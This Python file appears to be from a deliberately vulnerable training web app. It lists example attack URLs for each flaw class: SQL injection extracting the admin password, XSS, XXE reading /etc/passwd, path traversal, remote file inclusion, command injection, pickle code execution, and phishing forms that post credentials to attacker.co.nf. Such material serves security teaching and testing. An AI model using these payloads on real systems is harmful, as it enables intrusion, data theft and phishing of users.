from xml.etree import ElementTree
from db import USERS_XML

import subprocess, urllib, pickle

CASES = (("Blind SQL Injection (<i>boolean</i>)", "?id=2",
          "/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\" "
          "onclick=\"alert('checking if the first character for admin\\'s password is digit \\'7\\' (true in case of "
          "same result(s) as for \\'vulnerable\\')')",
          "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29"
          "#Boolean_Exploitation_Technique"),
         ("Blind SQL Injection (<i>time</i>)", "?id=2",
          "/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR(("
          "SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE("
          "%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\" onclick=\"alert('checking if the "
          "second character for admin\\'s password is letter \\'e\\' (true in case of delayed response)')",
          "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29"
          "#Time_delay_Exploitation_technique"),
         ("UNION SQL Injection", "?id=2",
          "/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20("
          "SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D"
          "%27admin%27)",
          "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29"
          "#Union_Exploitation_Technique"),
         ("Login Bypass", "/login?username=&amp;password=",
          "/login?username=admin&amp;password=%27%20OR%20%271%27%20LIKE%20%271",
          "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29"), (
             "HTTP Parameter Pollution", "/login?username=&amp;password=",
             "/login?username=admin&amp;password=%27%2F*&amp;password=*%2FOR%2F*&amp;password=*%2F%271%27%2F*&amp"
             ";password=*%2FLIKE%2F*&amp;password=*%2F%271",
             "https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29"), (
             "Cross Site Scripting (<i>reflected</i>)", "/?v=0.2",
             "/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E",
             "https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29"), (
             "Cross Site Scripting (<i>stored</i>)",
             "/?comment=\" onclick=\"document.location='/?comment='+prompt('please leave a comment'); return false",
             "/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E",
             "https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29"), (
             "Cross Site Scripting (<i>DOM</i>)", "/?#lang=en",
             "/?foobar#lang=en%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E",
             "https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29"), (
             "Cross Site Scripting (<i>JSONP</i>)",
             "/users.json?callback=process\" onclick=\"var script=document.createElement("
             "'script');script.src='/users.json?callback=process';document.getElementsByTagName('head')[0].appendChild("
             "script);return false",
             "/users.json?callback=alert(%22arbitrary%20javascript%22)%3Bprocess\" onclick=\"var "
             "script=document.createElement('script');script.src='/users.json?callback=alert("
             "%22arbitrary%20javascript%22)%3Bprocess';document.getElementsByTagName('head')[0].appendChild("
             "script);return false",
             "http://www.metaltoad.com/blog/using-jsonp-safely"), (
             "XML External Entity (<i>local</i>)", "/?xml=%3Croot%3E%3C%2Froot%3E",
             "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E"
             "%3Croot%3E%26xxe%3B%3C%2Froot%3E" if not subprocess.mswindows else
             "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini"
             "%22%3E"
             "%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E",
             "https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29"), (
             "XML External Entity (<i>remote</i>)", "/?xml=%3Croot%3E%3C%2Froot%3E",
             "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi"
             "%3Dh1rvVnvx%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E",
             "https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29"), (
             "Server Side Request Forgery", "/?path=",
             "/?path=http%3A%2F%2F127.0.0.1%3A631" if not subprocess.mswindows else
             "/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini",
             "http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/"), (
             "Blind XPath Injection (<i>boolean</i>)", "/?name=dian",
             "/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\" onclick=\"alert('checking if the "
             "third character for admin\\'s password is letter \\'n\\' (true in case of found item)')",
             "https://www.owasp.org/index.php/XPATH_Injection"), ("Cross Site Request Forgery", "/?comment=",
                                                                  "/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\" onclick=\"alert('please visit \\'vulnerable\\' page to see what this click has caused')",
                                                                  "https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29"),
         ("Frame Injection (<i>phishing</i>)", "/?v=0.2",
          "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flogin.html%22%20style%3D%22background-color"
          "%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse"
          "%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E",
          "http://www.gnucitizen.org/blog/frame-injection-fun/"), (
             "Frame Injection (<i>content spoofing</i>)", "/?v=0.2",
             "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2F%22%20style%3D%22background-color%3Awhite"
             "%3Bwidth"
             "%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D"
             "%220%22%3E%3C%2Fiframe%3E",
             "http://www.gnucitizen.org/blog/frame-injection-fun/"), ("Clickjacking", None,
                                                                      "/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fattacker.co.nf%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E",
                                                                      "https://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29"),
         ("Unvalidated Redirect", "/?redir=", "/?redir=http%3A%2F%2Fattacker.co.nf",
          "https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"), (
             "Arbitrary Code Execution", "/?domain=www.google.com",
             "/?domain=www.google.com%3B%20ifconfig" if not subprocess.mswindows else
             "/?domain=www.google.com%26%20ipconfig",
             "https://en.wikipedia.org/wiki/Arbitrary_code_execution"),
         ("Full Path Disclosure", "/?path=", "/?path=foobar", "https://www.owasp.org/index.php/Full_Path_Disclosure"), (
             "Source Code Disclosure", "/?path=", "/?path=dsvw.py",
             "https://www.imperva.com/resources/glossary?term=source_code_disclosure"), ("Path Traversal", "/?path=",
                                                                                         "/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" if not subprocess.mswindows else "/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini",
                                                                                         "https://www.owasp.org/index.php/Path_Traversal"),
         ("File Inclusion (<i>remote</i>)", "/?include=",
          "/?include=http%%3A%%2F%%2Fpastebin.com%%2Fraw.php%%3Fi%%3DN5ccE6iH&amp;cmd=%s" % (
              "ifconfig" if not subprocess.mswindows else "ipconfig"),
          "https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion"), (
             "HTTP Header Injection (<i>phishing</i>)", "/?charset=utf8",
             "/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E"
             "%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27"
             "%3E"
             "%3Cform%20action%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.php%22%20onSubmit%3D%22alert("
             "%27visit%20%5C%27http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished"
             "%20credentials"
             "%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A"
             "%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value"
             "%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E",
             "https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection"), (
             "Component with Known Vulnerability (<i>pickle</i>)", "/?object=%s" % urllib.quote(pickle.dumps(dict(
                     (_.findtext("username"), (_.findtext("name"), _.findtext("surname"))) for _ in
                     ElementTree.fromstring(USERS_XML).findall("user")))),
             "/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\" onclick=\"alert('checking if arbitrary code can be "
             "executed remotely (true in case of delayed response)')" % urllib.quote(
                     "ping -c 5 127.0.0.1" if not subprocess.mswindows else "ping -n 5 127.0.0.1"),
             "https://www.cs.uic.edu/~s/musings/pickle.html"), (
             "Denial of Service (<i>memory</i>)", "/?size=32", "/?size=9999999",
             "https://www.owasp.org/index.php/Denial_of_Service"))
